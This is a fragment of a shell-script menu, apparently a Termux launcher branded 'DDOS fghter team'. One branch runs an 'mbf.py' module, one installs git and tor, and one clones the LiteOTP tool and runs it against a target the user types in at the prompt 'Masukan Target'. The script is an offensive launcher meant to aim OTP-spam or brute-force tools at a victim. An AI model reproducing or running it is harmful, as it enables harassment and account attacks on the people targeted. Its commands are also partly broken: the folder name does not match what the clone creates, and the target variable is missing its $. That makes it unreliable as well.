...
then
clear
figlet "DDOS fghter team" | lolcat
echo "\033[33;1m"
sleep 3
cd module
python2 mbf.py
...
then
clear
toilet -f standard -F gay "DDOS fghter team" 
apt update
apt install git
apt install tor
...
then
clear
toilet "DDOS fghter team"
pkg install toilet
pkg install git
pkg install php
git clone https://github.com/Cvar1984/LiteOTP.git
mv liteOTP $HOME
cd $HOME/liteOTP
clear
read -p "Masukan Target==>:" target
php lite.php -T -t target
fi
